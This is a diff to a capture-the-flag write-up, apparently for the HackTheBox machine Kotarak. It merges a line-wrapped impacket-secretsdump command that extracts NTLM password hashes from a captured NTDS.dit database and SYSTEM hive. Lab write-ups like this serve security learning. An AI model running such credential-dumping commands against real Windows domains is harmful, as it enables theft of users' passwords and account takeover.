@@ -368,9 +368,7 @@ The file upload takes a bit of time but I wait patiently. After a couple of minu
 Now we can dump out the NTLM hashes using `secretsdump` from Impacket:
 
 ```bash
-impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system
- 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -hashes lmhash:nthash LOCAL -outputfi
-le ntlm_hashes
+impacket-secretsdump -ntds 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit -system 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin -hashes lmhash:nthash LOCAL -outputfile ntlm_hashes
 ```
 
 ![ntlm-hashes-32](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Kotarak/img/ntlm-hashes-32.png)
